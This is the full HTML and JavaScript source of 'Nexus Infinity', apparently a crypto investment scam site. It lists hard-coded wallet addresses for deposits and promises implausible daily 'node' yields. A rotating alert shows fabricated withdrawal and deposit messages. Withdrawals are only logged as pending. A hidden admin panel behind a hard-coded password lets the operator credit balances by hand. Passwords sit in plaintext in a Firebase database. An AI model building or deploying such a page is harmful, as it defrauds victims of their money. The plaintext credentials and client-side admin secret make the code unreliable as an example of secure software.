<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Institutional Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Syncopate:wght@700&display=swap');
        :root { --neon-red: #ff003c; --neon-pink: #ff00ff; --black: #050505; --glass: rgba(12, 12, 12, 0.98); }
        body { background: var(--black); color: white; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; overflow-x: hidden; }
        
        /* Premium Background */
        .auth-bg { 
            background: linear-gradient(rgba(5,5,5,0.8), rgba(255,0,60,0.1)), url('https://images.unsplash.com/photo-1639762681485-074b7f938ba0?auto=format&fit=crop&q=80&w=2000');
            background-size: cover; background-position: center; background-attachment: fixed;
        }

        .glass-panel { background: var(--glass); backdrop-filter: blur(50px); border: 1px solid rgba(255, 0, 60, 0.2); border-radius: 35px; box-shadow: 0 20px 50px rgba(255, 0, 60, 0.15); }
        .btn-master { background: linear-gradient(90deg, var(--neon-red), var(--neon-pink)); color: white; font-weight: 800; padding: 18px; border-radius: 20px; width: 100%; border: none; cursor: pointer; box-shadow: 0 10px 30px rgba(255, 0, 60, 0.4); text-transform: uppercase; letter-spacing: 1px; transition: 0.3s; }
        .btn-master:hover { transform: translateY(-2px); filter: brightness(1.1); }
        .input-dark { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 18px; padding: 18px; color: white; width: 100%; outline: none; transition: 0.3s; }
        .input-dark:focus { border-color: var(--neon-red); background: rgba(255, 0, 60, 0.03); }
        
        .nav-item { color: #444; text-align: center; cursor: pointer; font-size: 8px; font-weight: 800; transition: 0.3s; display: flex; flex-direction: column; align-items: center; gap: 4px; }
        .nav-item.active { color: var(--neon-red); text-shadow: 0 0 10px var(--neon-red); }
        .hidden { display: none !important; }

        #live-alert { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); z-index: 10000; display: none; width: 85%; max-width: 320px; animation: slideDown 0.5s ease; }
        @keyframes slideDown { from { transform: translate(-50%, -50px); opacity: 0; } to { transform: translate(-50%, 0); opacity: 1; } }
    </style>
</head>
<body>

    <div id="live-alert">
        <div class="glass-panel p-4 flex items-center gap-3 border-l-4 border-green-500">
            <div class="bg-green-500/20 p-2 rounded-full"><i class="fa-solid fa-shield-check text-green-500 text-xs"></i></div>
            <p id="alert-text" class="text-[9px] font-black uppercase tracking-tighter"></p>
        </div>
    </div>

    <div id="splash" class="fixed inset-0 bg-black z-[9999] flex flex-col items-center justify-center">
        <div class="w-28 h-28 bg-gradient-to-tr from-[#ff003c] to-[#ff00ff] rounded-[2.8rem] flex items-center justify-center text-6xl font-black text-white shadow-[0_0_50px_rgba(255,0,60,0.5)] animate-pulse">N</div>
        <h1 style="font-family: 'Syncopate'" class="mt-10 text-sm tracking-[0.5em] text-white">NEXUS<span class="text-[#ff003c]">INFINITY</span></h1>
        <p class="text-[8px] text-zinc-600 mt-6 font-black uppercase tracking-[0.3em]">Institutional Infrastructure Booting...</p>
    </div>

    <div id="auth-section" class="min-h-screen auth-bg flex flex-col justify-center p-8 hidden">
        <div class="max-w-sm mx-auto w-full space-y-10">
            <div id="logo-tap" class="text-center">
                <div class="w-20 h-20 bg-zinc-950 mx-auto rounded-3xl flex items-center justify-center text-4xl font-black border border-white/10 shadow-2xl">N</div>
                <h2 style="font-family: 'Syncopate'" class="mt-6 text-xl tracking-tighter uppercase font-black">Nexus<span class="text-[#ff003c]">Infinity</span></h2>
                <p class="text-[8px] text-zinc-500 mt-2 font-bold uppercase tracking-[0.3em]">Strategic Digital Access Hub</p>
            </div>
            
            <div id="login-ui" class="space-y-4 p-8 glass-panel border border-white/5">
                <input type="text" id="l-user" placeholder="Terminal Account ID" class="input-dark">
                <input type="password" id="l-pass" placeholder="Security Access Key" class="input-dark">
                <button onclick="handleLogin()" class="btn-master">Authorize Connection</button>
                <p onclick="toggleAuth(true)" class="text-center text-[9px] text-zinc-500 font-black uppercase cursor-pointer hover:text-white pt-2">Initialize New Node ID</p>
            </div>

            <div id="signup-ui" class="space-y-4 p-8 glass-panel hidden">
                <input type="text" id="s-user" placeholder="Create Unique ID" class="input-dark">
                <input type="password" id="s-pass" placeholder="Create Security Key" class="input-dark">
                <button onclick="handleSignup()" class="btn-master">Finalize Identity</button>
                <p onclick="toggleAuth(false)" class="text-center text-[9px] text-zinc-500 font-black uppercase cursor-pointer pt-2">Return to Terminal</p>
            </div>
        </div>
    </div>

    <div id="dashboard-section" class="hidden pb-32">
        <nav class="p-6 sticky top-0 bg-black/90 backdrop-blur-3xl z-[500] border-b border-white/5 flex justify-between items-center">
            <div class="flex items-center gap-3">
                <div id="admin-trigger" class="w-10 h-10 bg-zinc-900 rounded-xl flex items-center justify-center font-black border border-white/10">N</div>
                <div>
                    <span id="nav-user" class="text-sm font-black italic text-[#ff003c] uppercase leading-none">...</span>
                    <span class="text-[8px] text-green-500 font-bold uppercase block mt-1">● Secure Connection</span>
                </div>
            </div>
            <button onclick="logout()" class="w-10 h-10 rounded-full border border-white/10 flex items-center justify-center text-zinc-600"><i class="fa-solid fa-power-off"></i></button>
        </nav>

        <div id="page-home" class="p-6 space-y-6">
            <div class="glass-panel p-8 bg-gradient-to-br from-zinc-950 to-black relative overflow-hidden">
                <div class="relative z-10">
                    <p class="text-[8px] font-black text-zinc-500 uppercase tracking-widest mb-1">Total Institutional Equity</p>
                    <h2 id="balance-txt" class="text-5xl font-black italic tracking-tighter text-white">$0.00</h2>
                    <div class="mt-8 flex justify-between border-t border-white/5 pt-6">
                        <div><p class="text-[7px] text-zinc-500 uppercase font-black">Yield</p><p id="profit-txt" class="text-xl font-black text-[#ff00ff]">+$0.00</p></div>
                        <div class="text-right"><p class="text-[7px] text-zinc-500 uppercase font-black">Status</p><p class="text-[9px] font-black text-blue-500 animate-pulse uppercase">Optimized</p></div>
                    </div>
                </div>
            </div>
            <div id="nodes-market" class="grid gap-4"></div>
        </div>

        <div id="page-vault" class="p-6 space-y-8 hidden">
            <div class="glass-panel p-8 space-y-6">
                <h3 class="text-xl font-black italic text-[#ff003c] uppercase">Capital Injection</h3>
                <div class="space-y-3">
                    <div class="bg-black/40 p-4 rounded-2xl border border-white/5">
                        <p class="text-[7px] text-zinc-600 font-black uppercase">Binance / USDT TRC20</p>
                        <p class="text-[10px] font-bold text-pink-500 break-all">TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ</p>
                    </div>
                    <div class="bg-black/40 p-4 rounded-2xl border border-white/5">
                        <p class="text-[7px] text-zinc-600 font-black uppercase">Metamask / ETH ERC20</p>
                        <p class="text-[10px] font-bold text-blue-500 break-all">0xD9359EADE5F5bACA51fb7da043767Bc0685bC355</p>
                    </div>
                    <div class="bg-black/40 p-4 rounded-2xl border border-white/5">
                        <p class="text-[7px] text-zinc-600 font-black uppercase">Trust Wallet / TRX TRC20</p>
                        <p class="text-[10px] font-bold text-green-500 break-all">TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76</p>
                    </div>
                </div>
                <div class="space-y-4 pt-4 border-t border-white/5">
                    <select id="dep-method" class="input-dark bg-zinc-950">
                        <option value="Binance (USDT)">Binance (USDT)</option>
                        <option value="Metamask (ETH)">Metamask (ETH)</option>
                        <option value="Trust Wallet (TRX)">Trust Wallet (TRX)</option>
                    </select>
                    <input type="number" id="dep-amt" placeholder="Injection Amount ($)" class="input-dark">
                    <input type="text" id="dep-tid" placeholder="Transaction Hash (TID)" class="input-dark">
                    <input type="file" id="dep-proof" accept="image/*" class="text-[10px] text-zinc-500 block w-full file:mr-4 file:py-2 file:px-4 file:rounded-full file:bg-zinc-800 file:text-white file:border-0">
                    <img id="preview-img" class="mt-2 w-full h-32 rounded-xl border border-white/10 hidden object-cover">
                    <button onclick="submitDep()" class="btn-master">Authorize Injection</button>
                </div>
            </div>

            <div class="glass-panel p-8 space-y-6">
                <h3 class="text-xl font-black italic uppercase">Capital Payout</h3>
                <div class="space-y-4">
                    <select id="w-method" class="input-dark bg-zinc-950">
                        <option value="Binance Pay">Binance Pay</option>
                        <option value="Trust Wallet">Trust Wallet</option>
                        <option value="Metamask">Metamask</option>
                        <option value="OKX">OKX Exchange</option>
                        <option value="Bybit">Bybit Network</option>
                        <option value="Kraken">Kraken Terminal</option>
                        <option value="Coinbase">Coinbase</option>
                        <option value="Bitget">Bitget Node</option>
                    </select>
                    <input type="text" id="w-user" placeholder="Terminal Username" class="input-dark">
                    <input type="text" id="w-addr" placeholder="Destination Address / ID" class="input-dark">
                    <input type="number" id="w-amt" placeholder="Payout Amount ($)" class="input-dark">
                    <button onclick="submitWith()" class="btn-master !bg-zinc-800">Request Distribution</button>
                </div>
            </div>
        </div>

        <div id="page-history" class="p-6 space-y-6 hidden">
            <h3 class="text-xl font-black italic uppercase">Terminal Logs</h3>
            <div id="history-list" class="space-y-4"></div>
        </div>

        <div id="page-trust" class="p-6 space-y-6 hidden">
            <div class="glass-panel p-8 space-y-4">
                <h3 class="text-xl font-black italic text-[#ff003c]">COMPANY INFRASTRUCTURE</h3>
                <p class="text-[10px] leading-relaxed text-zinc-500 font-bold uppercase tracking-wider">Nexus Infinity is a secure institutional gateway for high-frequency node management and decentralized asset scaling.</p>
                <div class="space-y-2 pt-4">
                    <details class="bg-white/5 p-4 rounded-2xl border border-white/5"><summary class="text-[10px] font-black uppercase">Capital Protection?</summary><p class="text-[9px] text-zinc-500 mt-3">Assets are secured via SVG-V-4921 cold storage protocols with end-to-end institutional encryption.</p></details>
                    <details class="bg-white/5 p-4 rounded-2xl border border-white/5"><summary class="text-[10px] font-black uppercase">Payout Latency?</summary><p class="text-[9px] text-zinc-500 mt-3">Standard distributions are audited and settled within a 2-24 hour window depending on grid volume.</p></details>
                </div>
            </div>
        </div>

        <div class="fixed bottom-0 left-0 right-0 bg-black/90 backdrop-blur-3xl border-t border-white/10 p-6 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item active"><i class="fa-solid fa-microchip text-xl"></i><p>CORE</p></div>
            <div onclick="switchPage('vault')" class="nav-item"><i class="fa-solid fa-vault text-xl"></i><p>VAULT</p></div>
            <div onclick="switchPage('history')" class="nav-item"><i class="fa-solid fa-list-ul text-xl"></i><p>LOGS</p></div>
            <div onclick="switchPage('trust')" class="nav-item"><i class="fa-solid fa-globe text-xl"></i><p>TRUST</p></div>
        </div>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#050505] z-[9999] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8"><h2 class="text-xl font-black italic text-[#ff003c]">GRID OVERRIDE</h2><button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-4xl">&times;</button></div>
        <div id="admin-dep-list" class="space-y-6"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
          apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0",
          authDomain: "live-54fb4.firebaseapp.com",
          databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com",
          projectId: "live-54fb4",
          storageBucket: "live-54fb4.firebasestorage.app",
          messagingSenderId: "781910562842",
          appId: "1:781910562842:web:07a887f860d30fd17d99a3"
        };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // Professional Nodes
        const nodesArr = Array.from({length: 15}, (_, i) => ({
            id: i+1,
            title: i < 10 ? `Standard Node S-0${i+1}` : `Elite Apex A-0${i-9}`,
            price: i < 10 ? (i+1)*20 : (i-8)*500,
            daily: i < 10 ? (i+1)*2 : (i-8)*75,
            tier: i < 10 ? 'INSTITUTIONAL' : 'ELITE APEX'
        }));

        window.onload = () => {
            renderNodes();
            setInterval(showTrustAlert, 15000);
            setTimeout(() => {
                document.getElementById('splash').style.opacity = '0';
                setTimeout(() => {
                    document.getElementById('splash').classList.add('hidden');
                    const user = localStorage.getItem('nexus_user');
                    if(user) showDashboard(user);
                    else document.getElementById('auth-section').classList.remove('hidden');
                }, 800);
            }, 3000);
        };

        const trustMessages = ["Terminal ID 48** withdrew $140.00", "New Node S-05 Deployed Successfully", "Capital Injection Verified: $2,500.00", "Grid Stability: 99.9% Optimized"];
        function showTrustAlert() {
            const alertBox = document.getElementById('live-alert');
            document.getElementById('alert-text').innerText = trustMessages[Math.floor(Math.random()*trustMessages.length)];
            alertBox.style.display = 'block';
            setTimeout(() => alertBox.style.display = 'none', 5000);
        }

        function renderNodes() {
            document.getElementById('nodes-market').innerHTML = nodesArr.map(n => `
                <div class="glass-panel p-6 flex justify-between items-center ${n.tier === 'ELITE APEX' ? 'border-[#ff003c]' : ''}">
                    <div>
                        <p class="text-[7px] font-black text-zinc-500 uppercase mb-1">${n.tier}</p>
                        <h4 class="text-lg font-black italic tracking-tighter">${n.title}</h4>
                        <p class="text-[9px] font-bold text-green-500">+$${n.daily}/Day Yield</p>
                    </div>
                    <div class="text-right">
                        <p class="text-lg font-black">$${n.price}</p>
                        <button class="bg-white text-black px-4 py-2 rounded-xl text-[8px] font-black uppercase mt-1">Deploy</button>
                    </div>
                </div>`).join('');
        }

        // Base64 Proof Handling
        document.getElementById('dep-proof').onchange = (e) => {
            const reader = new FileReader();
            reader.readAsDataURL(e.target.files[0]);
            reader.onload = () => { 
                document.getElementById('preview-img').src = reader.result;
                document.getElementById('preview-img').classList.remove('hidden');
            };
        };

        window.submitDep = async () => {
            const user = localStorage.getItem('nexus_user');
            const amt = document.getElementById('dep-amt').value;
            const tid = document.getElementById('dep-tid').value;
            const method = document.getElementById('dep-method').value;
            const proof = document.getElementById('preview-img').src;
            if(!amt || !tid || !proof) return alert("Protocol Data Missing!");
            const hRef = push(ref(db, `users/${user}/history`));
            const entry = { user, amount: amt, tid, method, proof, status: 'pending', date: new Date().toLocaleString(), type: 'Deposit', hKey: hRef.key };
            await set(hRef, entry);
            await set(ref(db, `admin/deposits/${hRef.key}`), entry);
            alert("Injection Request Initialized.");
        };

        window.submitWith = async () => {
            const user = localStorage.getItem('nexus_user');
            const uName = document.getElementById('w-user').value;
            const addr = document.getElementById('w-addr').value;
            const amt = document.getElementById('w-amt').value;
            const method = document.getElementById('w-method').value;
            if(!amt || !addr) return alert("Missing Distribution Details!");
            const hRef = push(ref(db, `users/${user}/history`));
            await set(hRef, { amount: amt, address: addr, username: uName, method, status: 'pending', date: new Date().toLocaleString(), type: 'Withdraw' });
            alert("Payout Distribution Queued.");
        };

        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard-section').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('balance-txt').innerText = '$' + (d.balance || 0).toLocaleString();
                document.getElementById('profit-txt').innerText = '+$' + (d.profit || 0).toLocaleString();
                if(d.history) {
                    const logs = Object.entries(d.history).reverse();
                    document.getElementById('history-list').innerHTML = logs.map(([k, l]) => `
                        <div class="glass-panel p-5 flex justify-between items-center border-l-4 ${l.status === 'pending' ? 'border-yellow-500' : 'border-green-500'}">
                            <div><p class="text-[9px] font-black uppercase">${l.type}</p><p class="text-[7px] text-zinc-500">${l.date}</p></div>
                            <div class="text-right"><p class="text-sm font-black">$${l.amount}</p><span class="text-[7px] font-black uppercase ${l.status==='pending'?'text-yellow-500':'text-green-500'}">${l.status}</span></div>
                        </div>`).join('');
                }
            });
        }

        // Admin Secret [4 Taps]
        let taps = 0; document.getElementById('admin-trigger').onclick = () => {
            taps++; if(taps === 4) { if(prompt("Access Key:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } taps = 0; }
        };

        function loadAdmin() {
            onValue(ref(db, 'admin/deposits'), (snap) => {
                const d = snap.val();
                document.getElementById('admin-dep-list').innerHTML = d ? Object.entries(d).map(([id, l]) => `
                    <div class="glass-panel p-6 space-y-4">
                        <p class="text-xs">User: <span class="text-[#ff003c]">${l.user}</span> | Amt: <span class="text-green-500">$${l.amount}</span></p>
                        <p class="text-[8px] text-zinc-500">TID: ${l.tid} | Method: ${l.method}</p>
                        <img src="${l.proof}" class="w-full rounded-xl border border-white/10" onclick="window.open(this.src)">
                        <button onclick="approveDep('${id}','${l.user}',${l.amount},'${l.hKey}')" class="w-full bg-green-600 py-4 rounded-2xl text-[10px] font-black uppercase">Approve Capital</button>
                    </div>`).join('') : '<p class="text-center text-xs opacity-30">No Pending Grid Updates</p>';
            });
        }

        window.approveDep = async (aKey, u, a, hKey) => {
            const snap = await get(ref(db, `users/${u}`));
            await update(ref(db, `users/${u}`), { balance: (snap.val().balance || 0) + parseFloat(a) });
            await update(ref(db, `users/${u}/history/${hKey}`), { status: 'Approved' });
            await remove(ref(db, `admin/deposits/${aKey}`));
            alert("Capital Authorized.");
        };

        window.handleSignup = async () => {
            const u = document.getElementById('s-user').value.trim();
            const p = document.getElementById('s-pass').value.trim();
            if(!u || !p) return alert("Missing ID Credentials!");
            await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 });
            alert("ID Successfully Initialized!"); toggleAuth(false);
        };

        window.handleLogin = async () => {
            const u = document.getElementById('l-user').value.trim();
            const p = document.getElementById('l-pass').value.trim();
            const snap = await get(ref(db, `users/${u}`));
            if(snap.exists() && snap.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); }
            else alert("Authorization Denied!");
        };

        window.switchPage = (p) => {
            ['home', 'vault', 'history', 'trust'].forEach(pg => document.getElementById('page-'+pg).classList.add('hidden'));
            document.getElementById('page-'+p).classList.remove('hidden');
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            if(event) event.currentTarget.classList.add('active');
        };
        window.toggleAuth = (s) => {
            document.getElementById('login-ui').classList.toggle('hidden', s);
            document.getElementById('signup-ui').classList.toggle('hidden', !s);
        };
        window.logout = () => { localStorage.clear(); location.reload(); };
    </script>
</body>
</html>
